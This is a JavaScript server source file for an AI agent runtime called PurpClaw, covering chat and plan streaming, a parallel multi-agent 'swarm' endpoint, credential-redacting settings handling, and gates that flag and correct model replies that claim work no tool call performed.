          nextObjective: ev.nextObjective || null,
          turnsRemaining: ev.turnsRemaining != null ? ev.turnsRemaining : null,
          replanHint:    ev.replanHint || null,
          trigger:       ev.trigger || null,
          failedTool:    ev.failedTool || null,
          tool:          ev.tool || null,
          args:          ev.args || null,
          capsuleId:     ev.capsuleId || null,
        }));
        // Only emit a tool-call SSE sub-event when the reacharound carries an
        // actual tool name. Pure planning reacharounds (ev.tool absent) must NOT
        // be forwarded as tool-call — that creates a phantom "tool" row in the
        // cockpit with no name and no args, breaking the execution trail.
        if (ev.tool) sseEvent(res, 'tool-call', eventPayload(SSE_CTX, { tool: ev.tool, args: ev.args || null, capsuleId: ev.capsuleId || null }));
      } else if (ev.type === 'tool-result') {
        // Upgrade the matching tool-call evidence entry with the real result.
        const _pending = [..._toolEvidence].reverse().find(e => e.tool === ev.tool && !e._resolved);
        if (_pending) {
          Object.assign(_pending, CG.evidenceEntry(_pending.index, ev.tool, ev.args || {}, { ok: ev.ok !== false, content: ev.content || '', error: ev.error }));
          _pending.ok = ev.ok !== false;
        }
        sseEvent(res, 'tool-result', eventPayload(SSE_CTX, {
          tool: ev.tool,
          ok: ev.ok !== false,   // always boolean: true/false, never undefined
          code: ev.code,
          capsuleId: ev.capsuleId,
          content: (ev.content || ev.error || '').substring(0, 2000),
        }));
      } else if (ev.type === 'done') {
        // STREAM LAW: flush any tail the thinking filter held back (e.g. an
        // unterminated <think> block or a split close tag at end of stream).
        const _flushTail = _thinkFilter.flush();
        if (_flushTail) {
          fullReply += _flushTail;
          sseEvent(res, 'token', { content: _flushTail, model: modelName, provider: providerName });
        }
        // LARP GATE + CONTRADICTION GATE: deterministic check of the assembled
        // reply against real tool evidence. Flags ride the done event — never
        // silently pass a turn that claims work it didn't do.
        try {
          const _gateVerdict = CG.evaluate({
            prompt: String(body.message || ''),
            reply: typeof fullReply === 'string' ? fullReply : (ev.reply || ''),
            calls: _toolEvidence,
          });
          if (_gateVerdict && Array.isArray(_gateVerdict.violations) && _gateVerdict.violations.length) {
            ev.claimGate = { flagged: true, violations: _gateVerdict.violations.map(String) };
            safeLog('CHAT', `CLAIM_GATE FLAGGED: ${_gateVerdict.violations.join(', ')}`);
          }
          if (executionLease && getAgentTools().length > 0 && fullReply
              && /\b(no tools|no tool access|can'?t (?:execute|run|access) (?:anything|tools|commands)|zero tools|read[- ]only)\b/i.test(fullReply)) {
            ev.runtimeContradiction = { flagged: true, leaseAction: executionLease.action || 'RUN', advertisedCaps: getAgentTools().length };
            safeLog('CHAT', 'RUNTIME_STATE_CONTRADICTION: lease ACTIVE but model claims no tools');
          }
          // GATE 3+4 (runtime-truth): capability-promise + unverified-file-content
          // gates. Fires when the model PROMISES actions its envelope forbids —
          // the exact "I can review those files line by line" with zero tools bug.
          try {
            const _rtViolations = RT.checkCapabilityPromises(
              typeof fullReply === 'string' ? fullReply : (ev.reply || ''), _envelope);
            if (_rtViolations.length) {
              ev.runtimeContradiction = Object.assign({}, ev.runtimeContradiction || {}, {
                flagged: true,
                capabilityGate: _rtViolations,
              });
              safeLog('CHAT', 'CAPABILITY_PROMISE_CONTRADICTION: ' + _rtViolations.map(v => v.code + ':' + v.label).join(', '));
            }
            // EXECUTION PROMISE GATE: immediate-action language with no lease and
            // zero tool calls this turn = the "Watch me. SCANNING:" lie class.
            const _noAuthority = !executionLease && (_toolEvidence.length === 0);
            if (_noAuthority) {
              const _epViolations = RT.checkExecutionPromises(
                typeof fullReply === 'string' ? fullReply : (ev.reply || ''));
              if (_epViolations.length) {
                ev.runtimeContradiction = Object.assign({}, ev.runtimeContradiction || {}, {
                  flagged: true,
                  executionPromiseGate: _epViolations,
                });
                safeLog('CHAT', 'EXECUTION_PROMISE_CONTRADICTION: ' + _epViolations.map(v => v.matchedText).join(' | '));
              }
            }
          } catch (_rtErr) { safeLog('CHAT', 'runtime-truth gate failed (non-fatal): ' + _rtErr.message); }
        } catch (_cgErr) { safeLog('CHAT', 'claim-gate evaluation failed (non-fatal): ' + _cgErr.message); }
        modelName = ev.model || modelName;
        providerName = ev.provider || providerName;
        runOk = ev.ok !== false;
        runStatus = ev.status || (runOk ? 'complete' : 'partial');
        maxTurnsHit = ev.maxTurnsHit === true;
        runId = ev.runId || null;
        traceStats = ev.traceStats || null;
        // Capture token burn from the done event's usage payload
        if (ev.usage) {
          totalTokensUsed = ev.usage.total_tokens || 0;
          promptTokensUsed = ev.usage.prompt_tokens || 0;
          completionTokensUsed = ev.usage.completion_tokens || 0;
          if (ev.usage.reasoning_tokens != null) reasoningTokensUsed = ev.usage.reasoning_tokens;
        }
        // Capture capsuleId before break — SET_SSE_CTX is a full-replace (not merge)
        // so this is the only way to carry it through to the final done event.
        _lastCapsuleId = ev.capsuleId != null ? ev.capsuleId : null;
        break;
      } else if (ev.type === 'error') {
        throw new Error(ev.error);
      }
    }
    // Commit the exchange so the NEXT message sees it. Without this the
    // gateway answered every turn from a blank slate.
    // The assistant turn carries its own telemetry receipt (Rule 3): history
    // reload shows what ACTUALLY served each message, never current config.
    // A pause that never reached a safe point before the run ended is stale —
    // consume it here so it cannot assassinate the next mission's first turn.
    if (PSTEER_SSE && PSTEER_SSE.pollInterrupt().pending) PSTEER_SSE.clearInterrupt();

    // TERMINAL LAW: if visibleContentLength === 0, do NOT emit done:complete.
    // Backend and UI must agree: a reasoning-only or empty stream is a failure,
    // not a successful complete. Emit CHAT_PROVIDER_EMPTY_OUTPUT so UI and
    // backend agree on the terminal state.
    if (runOk && !fullReply.trim()) {
      safeLog('GATE1', `[agent-loop] EMPTY_OUTPUT: model=${modelName} provider=${providerName} toolCalls=${toolCallsUsed} msg="${String(message).slice(0, 40)}"`);
      sseEvent(res, 'error', {
        error: 'CHAT_PROVIDER_EMPTY_OUTPUT',
        errorCode: 'CHAT_PROVIDER_EMPTY_OUTPUT',
        terminal: true,
        turnId,
        attemptId,
        attempt: attemptN,
        retryable: true,
        failureKind: 'provider_empty_output',
        retryOf: attemptN > 1 ? (turnId + '_a' + (attemptN - 1)) : null,
        provider: providerName || null,
        model: modelName || null,
        toolCalls: toolCallsUsed,
      });
      SET_SSE_CTX({ sessionId: null, missionId: null, runId: null, turnId: null, turn: 0, attemptId: null });
      return res.end();
    }

    sseEvent(res, 'phase', { phase: 'done', state: 'DONE' });
    const durationMs = Date.now() - _t0;
    const route = effectiveLease ? 'EXECUTE' : (IS_CHAT_FAST ? 'CHAT' : 'AGENT');
    // ── EXECUTION-PROMISE CONTRADICTION GATE (runAgent lane) — same law as the
    // chat-fast lane, but authority-aware: promise language is only a violation
    // when the turn had NO lease and ZERO effectful calls. An EXECUTE turn that
    // says "on it" after running 18 real tools is truthful narration.
    if (!effectiveLease && toolCallsUsed === 0 && fullReply) {
      const _promiseViolations = RT.checkExecutionPromises(fullReply);
      if (_promiseViolations.length) {
        safeLog('EXECUTION_PROMISE_CONTRADICTION', JSON.stringify({
          sessionId, route, toolCalls: toolCallsUsed,
          matched: _promiseViolations.map(v => v.matchedText),
        }));
        sseEvent(res, 'truth-gate', { code: 'EXECUTION_PROMISE_CONTRADICTION',
          violations: _promiseViolations, enforcement: 'correction_appended' });
        const _correction = '\n\n[CORRECTION] The above promised immediate execution, but this turn ran with no execution lease and zero tool calls — nothing was executed. Hit Execute (or arm DRIVE Autonomous) and resend to run this for real.';
        fullReply += _correction;
        // Reply already streamed token-by-token above — the client never sees
        // a history-only append. Emit the correction as a late token so the
        // visible bubble carries the truthful statement.
        sseEvent(res, 'token', { content: _correction,
          model: modelName || null, provider: providerName || null });
      }
    }
    // ── MODEL TRUTH RECEIPT — requested ≠ resolved, persisted per message ──
    const telemetry = {
      requestedProvider,
      requestedModel,
      provider: providerName || null,          // RESOLVED provider
      model: modelName || null,                // RESOLVED model (served, not configured)
      route,
      lease: effectiveLease ? ((effectiveLease.source || 'lease') + (effectiveLease.action ? ':' + effectiveLease.action : '')) : null,
      leaseSource: effectiveLease ? (effectiveLease.source || null) : null,
      bindings: bindings.length ? bindings : null,           // §3 provenance
      capsCount: _bindingCaps ? _bindingCaps.caps.length : null,  // §7 caps:N
      toolCalls: toolCallsUsed,
      agentCalls: agentCallsUsed,
      skillCalls: skillCallsUsed,
      fallbackCount: providerFailovers.length,
      fallbackPath: providerFailovers.map(f => ({
        provider: f.from, status: f.reason === 'rate_limited' ? 'rate_limited' : (f.reason || 'failed'),
        failureClass: f.failureClass || null,
        statusCode: f.statusCode ?? null,
        next: f.to || null,
      })),
      // SUCCESS RECEIPT (P0 #7): the full attempt chain — every provider tried,
      // its failure class, and where the turn finally resolved. One user turn,
      // one assistant turn, multiple attempt receipts. streamChatAuto stamps
      // __providerAttempts onto the opts object we passed — read BOTH the base
      // _chatOpts and the attempt-1 _streamOpts copy.
      providerAttempts: (_providerAttemptsReceipt || []).map((a, i) => ({
        attempt: i + 1, provider: a.provider || null, ok: !!a.ok,
        failureClass: a.failureClass || (a.ok ? null : (a.reason || null)),
        skipped: a.skipped || null, cooldownMs: a.cooldownMs || 0,
      })),
      promptTokens: promptTokensUsed || null,
      completionTokens: completionTokensUsed || null,
      reasoningTokens: reasoningTokensUsed,     // null = unavailable from provider
      totalTokens: totalTokensUsed || null,
      reasoningState,
      ttftMs,
      durationMs,
      status: runStatus,
    };
    sseEvent(res, 'telemetry', { ...telemetry, type: 'telemetry' });      // dedicated canonical telemetry event
    // EXECUTION PROMISE GATE (final-lane pass): runs on EVERY completed chat
    // turn regardless of which lane produced the reply (agent loop, direct
    // streamChatAuto, failover). No lease + zero tool calls + immediate-action
    // language = flagged. This closes the fast-lane bypass.
    try {
      const _noAuth = !executionLease && (!toolCallsUsed || toolCallsUsed.length === 0);
      if (_noAuth && typeof fullReply === 'string' && fullReply.trim()) {
        const _epViolations = RT.checkExecutionPromises(fullReply);
        if (_epViolations.length) {
          const _rc = Object.assign({}, (typeof runtimeContradiction === 'object' && runtimeContradiction) || {}, {
            flagged: true,
            executionPromiseGate: _epViolations,
          });
          telemetry.runtimeContradiction = _rc;
          safeLog('CHAT', 'EXECUTION_PROMISE_CONTRADICTION(final): ' + _epViolations.map(v => v.matchedText).join(' | '));
        }
      }
    } catch (_epErr) { safeLog('CHAT', 'execution-promise final gate failed (non-fatal): ' + _epErr.message); }
    appendChatTurn(sessionId, 'user', message, source);
    appendChatTurn(sessionId, 'assistant', fullReply, source, telemetry || null);
    sseEvent(res, 'done', eventPayload(SSE_CTX, {
      ok: runOk,
      status: runStatus || (runOk ? 'complete' : 'failed'),   // never undefined
      maxTurnsHit,
      reply: fullReply,
      model: modelName,
      provider: providerName || null,
      providerFailovers,
      providerStatus: runOk ? 'answered' : 'not-verified',
      toolCalls: toolCallsUsed,
      source,
      sessionId,
      historyTurns: getChatHistory(sessionId).length,
      runId,
      traceStats,
      capsuleId: _lastCapsuleId ?? null,
      // Token burn — from done event usage payload
      totalTokens: totalTokensUsed,
      promptTokens: promptTokensUsed,
      completionTokens: completionTokensUsed,
      telemetry,   // full model-truth receipt on done as well
    }));
    SET_SSE_CTX({ sessionId: null, missionId: null, runId: null, turnId: null, turn: 0 });
    return res.end();
  } catch (e) {
    clearApprovalHeartbeat();
    sseEvent(res, 'phase', { phase: 'error' });
    // NETWORK_ERROR terminal taxonomy: a transport/stream failure is its own
    // TERMINAL runtime event, distinct from "no tools" (authority absent) and
    // from "tool registry empty". It carries: terminal=true so every consumer
    // stops timers/token counters/renderers/pet loops; attempt lineage so a
    // retry rejoins this turn instead of spawning a duplicate card.
    const _isNetwork = /network|socket hang up|ECONNRESET|EPIPE|ETIMEDOUT|fetch failed|aborted/i.test(String(e && e.message));
    sseEvent(res, 'error', {
      error: e.message,
      errorCode: _isNetwork ? 'NETWORK_ERROR' : 'TURN_FAILED',
      terminal: true,
      turnId,
      attemptId,
      attempt: attemptN,
      retryable: true,
      failureKind: 'provider_transport',
      retryOf: attemptN > 1 ? (turnId + '_a' + (attemptN - 1)) : null,
      hint: 'retry with same turnId, attempt+1, new attemptId to continue this turn lineage',
    });
    console.error('[handleChatStream] SSE loop error:', e && e.message ? e.message : String(e));
    console.error('[handleChatStream] stack:', e && e.stack ? e.stack.slice(0, 800) : 'no stack');
    SET_SSE_CTX({ sessionId: null, missionId: null, runId: null, turnId: null, turn: 0, attemptId: null });
    return res.end();
  }
}

// SWARM — /api/chat/swarm
// Fan out a single user message to N specialized agents in parallel,
// each with its own system prompt and its own SSE event channel. The
// user sees N bubbles appearing in real-time, each with its own
// progress.
//
// Events:
//   phase    → {phase: 'received'|'spawning'|'synthesizing'|'done'}
//   agent    → {id, role, status: 'started'|'streaming'|'done'|'error', model}
//   token    → {agentId, content, model}
//   agent_done → {agentId, ok, length, elapsed}
//   synthesis → {content, model}
//   done     → {ok, agents: [...], synthesis: {content, model}}
//   error    → {error, agentId?}
async function handleChatSwarm(req, res) {
  let body = null;
  try { body = await parseBody(req); }
  catch (e) {
    sseStart(res);
    sseEvent(res, 'error', { error: 'bad body: ' + e.message });
    return res.end();
  }
  const { message, agents: agentOverride, source = 'swarm' } = body;
  if (!message) {
    sseStart(res);
    sseEvent(res, 'error', { error: 'message required' });
    return res.end();
  }

  // Default agent roster: 3 specialists with distinct system prompts.
  // Users can override via the `agents` field (array of {id, role, system, model}).
  const defaultAgents = [
    {
      id: 'planner',
      role: 'Planner',
      emoji: '🧭',
      system: 'You are the PurpClaw Planner, a senior strategist. Given a user goal, produce a concise step-by-step plan (3-7 steps). For each step: title, what to do, what the output looks like. Be specific, not generic. Output as a numbered list. Maximum 200 words.',
      model: undefined,  // use default
    },
    {
      id: 'researcher',
      role: 'Researcher',
      emoji: '🔬',
      system: 'You are the PurpClaw Researcher, an investigative analyst. Given a user goal, identify the key questions, then surface relevant facts, prior art, and best practices. Focus on the most useful 3-5 things a builder would need to know. Be concrete, not theoretical. Maximum 200 words.',
      model: undefined,
    },
    {
      id: 'builder',
      role: 'Builder',
      emoji: '🛠️',
      system: 'You are the PurpClaw Builder, an implementation engineer. Given a user goal, identify the technical implementation: which files/functions to touch, which patterns to use, what the diff would look like. Be specific with file paths and function names. Maximum 200 words.',
      model: undefined,
    },
  ];
  const agents = Array.isArray(agentOverride) && agentOverride.length
    ? agentOverride
    : defaultAgents;

  sseStart(res);
  sseEvent(res, 'phase', { phase: 'received', message: message.slice(0, 100), agentCount: agents.length });
  sseEvent(res, 'phase', { phase: 'spawning' });

  const llm = require('./lib/llm-provider');
  const swarmT0 = Date.now();
  const agentResults = new Map();

  // Spawn all agents in parallel
  const promises = agents.map(async (agent) => {
    const t0 = Date.now();
    sseEvent(res, 'agent', { id: agent.id, role: agent.role, emoji: agent.emoji || '·', status: 'started', model: agent.model || 'auto' });
    let text = '';
    try {
      for await (const chunk of llm.streamChat([
        { role: 'system', content: agent.system },
        { role: 'user', content: message },
      ], { temperature: 0.4, maxTokens: 600, model: agent.model })) {
        if (chunk.content) {
          text += chunk.content;
          sseEvent(res, 'token', { agentId: agent.id, content: chunk.content, model: chunk.model });
        } else if (chunk.done) {
          break;
        }
      }
      const result = { id: agent.id, role: agent.role, emoji: agent.emoji || '·', ok: true, content: text, length: text.length, elapsed: Date.now() - t0, model: 'auto' };
      agentResults.set(agent.id, result);
      sseEvent(res, 'agent_done', result);
      return result;
    } catch (e) {
      const result = { id: agent.id, role: agent.role, emoji: agent.emoji || '·', ok: false, error: e.message, elapsed: Date.now() - t0 };
      agentResults.set(agent.id, result);
      sseEvent(res, 'agent_done', result);
      return result;
    }
  });

  const results = await Promise.allSettled(promises);
  const succeeded = results.filter(r => r.status === 'fulfilled' && r.value.ok).map(r => r.value);

  // Synthesize the final answer from all agent outputs
  sseEvent(res, 'phase', { phase: 'synthesizing', succeeded: succeeded.length, total: agents.length });
  let synthesis = '';
  let synthModel = '';
  if (succeeded.length) {
    const synthPrompt = `You are the PurpClaw Synthesizer. You have ${succeeded.length} specialist analyses for the user's goal. Merge them into one tight 100-150 word final response that takes the best of each perspective.

User goal: ${message}

Specialist outputs:
${succeeded.map(r => `--- ${r.role.toUpperCase()} (${r.elapsed}ms) ---\n${r.content}`).join('\n\n')}

Write a single concise synthesized response. Do not repeat the question. Output pure prose, no headings.`;
    try {
      for await (const chunk of llm.streamChat([
        { role: 'system', content: 'You are a concise synthesizer. Output one tight paragraph of merged insight.' },
        { role: 'user', content: synthPrompt },
      ], { temperature: 0.2, maxTokens: 600 })) {
        if (chunk.content) {
          synthesis += chunk.content;
          synthModel = chunk.model || synthModel;
          sseEvent(res, 'token', { agentId: 'synthesizer', content: chunk.content, model: chunk.model });
        } else if (chunk.done) {
          break;
        }
      }
    } catch (e) {
      // Synthesizer failed — fall back to concatenation
      synthesis = succeeded.map(r => `**[${r.role}]** ${r.content}`).join('\n\n');
    }
  }

  sseEvent(res, 'synthesis', { content: synthesis, model: synthModel });
  sseEvent(res, 'phase', { phase: 'done' });
  sseEvent(res, 'done', {
    ok: succeeded.length > 0,
    agents: Array.from(agentResults.values()),
    synthesis: { content: synthesis, model: synthModel },
    totalElapsed: Date.now() - swarmT0,
  });
  return res.end();
}

// Streaming plan handler. Same logic as the JSON endpoint, but emits
// each phase + each step as an SSE event so the UI can show progress:
//   event: phase     data: {phase: 'search'|'propose'|'merge'|'done'}
//   event: context   data: {sources: [...]}  ← top-5 codebase files
//   event: proposal  data: {model, ok, text?, error?, elapsed}
//   event: merged    data: {steps, judge, mode}
//   event: done      data: {ok, stepCount, ...}
//   event: error     data: {error}
async function handlePlanStream(req, res) {
  const body = await parseBody(req);
  const { goal, source = 'plan', mode = 'single', models: fanoutModels, context: useContext = true } = body;
  if (!goal) {
    sseStart(res);
    sseEvent(res, 'error', { error: 'goal required' });
    return res.end();
  }
  sseStart(res);
  sseEvent(res, 'phase', { phase: 'received', goal });
  sseComment(res, 'starting plan stream for: ' + goal.slice(0, 60));

  try {
    const llm = require('./lib/llm-provider');

    // Codebase context
    let codebaseContext = '';
    let contextSources = [];
    if (useContext) {
      sseEvent(res, 'phase', { phase: 'search', message: 'searching codebase for relevant files' });
      try {
        const { searchSemantic } = require('./lib/commands/code');
        const r = await searchSemantic(goal, 5);
        if (r && r.results && r.results.length) {
          contextSources = r.results.map(x => ({ file: x.file, score: x.score }));
          const ctxLines = r.results.map((x, i) => {
            const lines = (x.content || '').split('\n').slice(0, 12).join('\n');
            return `[${i + 1}] ${x.file} (score ${x.score.toFixed(3)})\n${lines}`;
          });
          codebaseContext = `\n\nCodebase context (top ${r.results.length} relevant files from semantic search over the live codebase):\n${ctxLines.join('\n\n')}`;
          sseEvent(res, 'context', { sources: contextSources, count: contextSources.length });
        }
      } catch (e) {
        sseEvent(res, 'phase', { phase: 'search-warning', error: e.message });
      }
    }

    const PLAN_SYSTEM = `You are the PurpClaw planning assistant for the PURPCLAW runtime.
Decompose the user's goal into 3-7 concrete, ordered steps. For each step return a JSON object with:
  - "title": short imperative ("Pull recent training data", "Generate the chart")
  - "command": the actual prompt / kernel goal / tool call to execute
  - "route": one of [chat, kernel, groupchat, research, swarm, mission, code, services, training, autoresearch]
  - "expected": what success looks like (1 sentence)
  - "rationale": 1 sentence explaining why this step is needed

If codebase context is provided, USE IT: reference real file paths, real function names, real existing patterns. Steps should be grounded in the actual codebase, not generic advice.

Respond ONLY with a JSON array of those step objects, no prose, no markdown fences.`;

    const userPrompt = goal + codebaseContext;

    if (mode === 'single') {
      sseEvent(res, 'phase', { phase: 'propose', model: fanoutModels?.[0] || 'auto' });
      let planText = '';
      try {
        const chatOpts = { maxTokens: 2500, temperature: 0.2 };
        if (Array.isArray(fanoutModels) && fanoutModels[0]) chatOpts.model = fanoutModels[0];
        // Stream tokens
        for await (const chunk of llm.streamChat([
          { role: 'system', content: PLAN_SYSTEM },
          { role: 'user', content: userPrompt },
        ], chatOpts)) {
          if (chunk.content) {
            planText += chunk.content;
            sseEvent(res, 'token', { content: chunk.content, model: chunk.model });
          } else if (chunk.done) {
            sseEvent(res, 'proposal', { model: chunk.model, ok: true, elapsed: 0 });
          }
        }
      } catch (e) {
        sseEvent(res, 'error', { error: 'llm: ' + e.message });
        return res.end();
      }
      const parsed = parsePlanJson(planText);
      sseEvent(res, 'merged', { steps: parsed.steps, judge: 'self', mode: 'single-stream', contextSources });
      sseEvent(res, 'done', { ok: true, stepCount: parsed.steps.length, parseError: parsed.parseError });
      return res.end();
    }

    if (mode === 'fanout') {
      const candidates = Array.isArray(fanoutModels) && fanoutModels.length
        ? fanoutModels.slice(0, 5)
        : ['openai/gpt-oss-20b:free', 'z-ai/glm-4.5-air:free', 'google/gemma-4-26b-a4b-it:free'];
      sseEvent(res, 'phase', { phase: 'fanout', candidates });

      const proposals = await Promise.allSettled(candidates.map(async (model) => {
        const t0 = Date.now();
        try {
          let text = '';
          for await (const chunk of llm.streamChat([
            { role: 'system', content: PLAN_SYSTEM },
            { role: 'user', content: userPrompt },
          ], { maxTokens: 2000, temperature: 0.4, model })) {
            if (chunk.content) text += chunk.content;
            if (chunk.done) break;
          }
          sseEvent(res, 'proposal', { model, ok: true, elapsed: Date.now() - t0, length: text.length });
          return { model, ok: true, text };
        } catch (e) {
          sseEvent(res, 'proposal', { model, ok: false, error: e.message, elapsed: Date.now() - t0 });
          return { model, ok: false, error: e.message };
        }
      }));

      const succeeded = proposals
        .filter(p => p.status === 'fulfilled' && p.value.ok)
        .map(p => p.value);
      if (!succeeded.length) {
        sseEvent(res, 'error', { error: 'all fan-out models failed' });
        return res.end();
      }

      // Judge merges
      const judgeModel = succeeded[0].model;
      sseEvent(res, 'phase', { phase: 'merge', judge: judgeModel, candidates: succeeded.length });
      const judgePrompt = `You are a senior planner. Multiple AI models proposed plans for: "${goal}". Merge the BEST steps into a single 3-7 step JSON array. Each step: {title, command, route, expected, rationale}. Output pure JSON only.

Proposals:
${succeeded.map((p, i) => `--- MODEL ${i + 1} (${p.model}) ---\n${p.text}`).join('\n\n')}`;
      let mergedText = '';
      try {
        for await (const chunk of llm.streamChat([
          { role: 'system', content: 'You merge multiple AI plans into the single best plan. Output pure JSON only.' },
          { role: 'user', content: judgePrompt },
        ], { maxTokens: 1800, temperature: 0.1, model: judgeModel })) {
          if (chunk.content) {
            mergedText += chunk.content;
            sseEvent(res, 'token', { content: chunk.content, model: chunk.model });
          } else if (chunk.done) {
            break;
          }
        }
      } catch (e) {
        const fallback = parsePlanJson(succeeded[0].text);
        sseEvent(res, 'merged', { steps: fallback.steps, judge: judgeModel, mode: 'fanout-fallback', contextSources });
        sseEvent(res, 'done', { ok: true, stepCount: fallback.steps.length, judgeError: e.message });
        return res.end();
      }
      const parsed = parsePlanJson(mergedText);
      sseEvent(res, 'merged', { steps: parsed.steps, judge: judgeModel, mode: 'fanout', contextSources });
      sseEvent(res, 'done', { ok: true, stepCount: parsed.steps.length, parseError: parsed.parseError });
      return res.end();
    }

    sseEvent(res, 'error', { error: 'mode must be "single" or "fanout"' });
    return res.end();
  } catch (e) {
    sseEvent(res, 'error', { error: e.message });
    return res.end();
  }
}

function migratePortableFile(legacyPath, portablePath) {
  try {
    if (!fs.existsSync(portablePath) && fs.existsSync(legacyPath)) {
      fs.mkdirSync(path.dirname(portablePath), { recursive: true });
      fs.copyFileSync(legacyPath, portablePath);
    }
  } catch { /* legacy state remains readable on disk; startup must continue */ }
}
migratePortableFile(path.join(PURP_DIR, 'purpclaw_settings.json'), SETTINGS_FILE);
migratePortableFile(path.join(PURP_DIR, 'samantha_memory.json'), MEMORY_FILE);

function loadSettings() {
  try { if (fs.existsSync(SETTINGS_FILE)) Object.assign(state.settings, JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'))); } catch (e) {}
}
function saveSettings() {
  try { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(state.settings, null, 2)); } catch (e) {}
}
loadSettings();

// Settings are server-owned. Operator surfaces may know whether a credential
// is configured, but must never receive the credential value. This applies to
// GET responses and the response after a write/switch as well.
function publicBackend(backend = {}) {
  const { apiKey, ...safe } = backend;
  return { ...safe, hasApiKey: Boolean(apiKey) };
}

function publicSettings(settings = {}) {
  const safe = {};
  for (const [key, value] of Object.entries(settings)) {
    if (key === 'aiBackends') {
      safe.aiBackends = (Array.isArray(value) ? value : []).map(publicBackend);
      continue;
    }
    if (/(?:api.?key|token|secret|password)/i.test(key)) continue;
    safe[key] = value;
  }
  return safe;
}

function loadMemory() { try { return JSON.parse(fs.readFileSync(MEMORY_FILE, 'utf8')); } catch (e) { return { facts: [] }; } }
function saveMemory(m) { try { fs.writeFileSync(MEMORY_FILE, JSON.stringify(m, null, 2)); } catch (e) {} }

// Live event subscribers for /api/cognitive/events SSE
const logSubscribers = new Set();

const taskQueue = [];
let taskId = 0;
const SWARM_AGENTS = ['duck', 'ghost', 'dragon', 'octopus', 'robot', 'mushroom', 'chonk', 'owl', 'cactus', 'penguin', 'goose', 'turtle', 'axolotl', 'rabbit', 'void', 'wolf', 'spider', 'raven', 'snake', 'bee', 'bunny'];

let purpProc = null, purpOut = '';
const OPENCLAW_GW = process.env.OPENCLAW_GATEWAY || 'ws://127.0.0.1:18789';

function san(s) { return typeof s !== 'string' ? '' : s.replace(/[`$;|><&{}\[\]'"]/g, '').replace(/\r?\n/g, ' ').substring(0, 500); }
function coord(v) { const n = Number(v); return (isNaN(n) || n < 0 || n > 10000) ? 0 : Math.floor(n); }
function ok(text) { return { content: [{ type: 'text', text: String(text).substring(0, 8000) }] }; }

// Canonical tool bridge: the runTool switch below only hand-implements a subset
// of builtins. Everything else lives in the shared tool registry (lib/tools).
// Route those through ToolRuntime so the deterministic ladder (scope, schema,
// path-security, permissions, governance, approval) still enforces — restoring
// the pre-replacement registry dispatch WITH the permission boundary, not the
// old raw registry.invoke() that bypassed it. Lazy to avoid init-time cycles.
let _toolRuntime = null;
function getToolRuntime() {
  if (!_toolRuntime) {
    const { ToolRuntime } = require('./lib/tool-runtime');
    _toolRuntime = new ToolRuntime({ permissionProfile: process.env.PURPCLAW_API_TOOL_PROFILE || 'workspace-write' });
    // Receipt bridge: ToolRuntime emits on its own EventEmitter; without this
    // bridge nothing lands in agent_work/trace/events.jsonl, so tool executions
    // on the API path have no canonical lineage. announce.tool() writes the
    // local trace (and POSTs to eventbus best-effort). Never throws.
    try {
      const { announce } = require('./lib/events');
      _toolRuntime.on('tool.start', (p) => announce.tool('start', p));
      _toolRuntime.on('tool.complete', (p) => announce.tool('complete', p));
      _toolRuntime.on('tool.guardrail.tripped', (p) => announce.tool('failed', { ...p, error: p.error || 'guardrail tripped' }));
      _toolRuntime.on('tool.validation.failed', (p) => announce.tool('failed', { ...p, error: p.error || 'validation failed' }));
    } catch (e) { safeLog('DEBUG', 'receipt bridge unavailable: ' + e.message); }
  }
  return _toolRuntime;
}

// Agent roster from the canonical registry file, read fresh (runtime truth) —
// NOT a baked constant. Satisfies acceptance gate registry-dynamic-counts and
// spec §9/§K: surfaces derive counts from registries, never hard-coded arrays.
function loadAgentRoster() {
  try {
    const AGENTS = require('./lib/agent-registry');
    const roster = AGENTS.listAgents();
    const stats = new Map(roster.map(agent => [agent.key, {
      total: 0, complete: 0, partial: 0, failed: 0, unverified: 0, recent: [],
    }]));

    // A historical mission belongs to a Soul only when its durable envelope
    // explicitly records that assignment. Old role-only rows are deliberately
    // not reinterpreted: doing so would fabricate history using today's map.
    const rows = require('./lib/missions').list({ limit: 5000 }).missions || [];
    for (const mission of rows) {
      const envelope = mission.envelope || {};
      const assigned = new Set(
        (Array.isArray(envelope.agentAssignments) ? envelope.agentAssignments : [])
          .map(item => String(item && item.canonicalAgent || '').toLowerCase())
          .filter(key => stats.has(key))
      );
      for (const requested of Array.isArray(envelope.agents) ? envelope.agents : []) {
        const direct = AGENTS.getAgent(requested);
        // Composer roles are not direct Soul references. Only count a raw
        // value when it names the canonical key/name itself.
        if (direct && (String(requested).toLowerCase() === direct.key ||
            String(requested).toLowerCase() === String(direct.name).toLowerCase())) {
          assigned.add(direct.key);
        }
      }
      for (const key of assigned) {
        const item = stats.get(key);
        item.total += 1;
        if (Object.hasOwn(item, mission.status)) item[mission.status] += 1;
        if (item.recent.length < 8) item.recent.push({
          missionId: mission.missionId,
          status: mission.status,
          prompt: mission.prompt,
          completedAt: mission.completedAt,
        });
      }
    }

    return roster.map(agent => ({ ...agent, missionStats: stats.get(agent.key) }));
  } catch { return []; }
}

// ── SLASH BINDING REGISTRY — dynamic, generated from live registries (§2) ──
const SLASH_BINDINGS = new Map();
const slashRegistry = require('./lib/slash-registry').createSlashRegistry({
  loadAgentRoster,
  TOOLS: require('./lib/tools'),
  skillRegistry: { list: () => require('./lib/tools/skills-registry').scanSkills() },
});

// ── §4/§7 EFFECTIVE CAPABILITY SET from bindings ─────────────────────────
// caps = agent.tools (if /agent bound) ∪ explicit /tool picks,
// then ∩ skill.allowTools when a skill declares one. Computed server-side,
// logged in telemetry. Gate 2 provable: tools come from an explicit set.
function computeEffectiveCaps(bindings) {
  const toolBindings = bindings.filter(b => b.kind === 'tool').map(b => b.id);
  const agentBinding = [...bindings].reverse().find(b => b.kind === 'agent');
  const skillBinding = [...bindings].reverse().find(b => b.kind === 'skill');

  const caps = new Set();
  // agent default tools (from roster entry, if declared)
  if (agentBinding) {
    try {
      const roster = loadAgentRoster();
      const soul = roster.find(a => (a.name || a.key || '').toLowerCase() === String(agentBinding.id).toLowerCase());
      for (const t of (soul && soul.tools) || []) caps.add(t);
    } catch {}
  }
  for (const t of toolBindings) caps.add(t);

  // skill allowTools scopes the whole turn's capability set
  let allowScope = null;
  if (skillBinding) {
    try {
      const skills = slashRegistry.skills();
      const s = skills.find(x => x.id === skillBinding.id || x.name === skillBinding.id);
      if (s && Array.isArray(s.allowTools)) allowScope = new Set(s.allowTools);
    } catch {}
  }
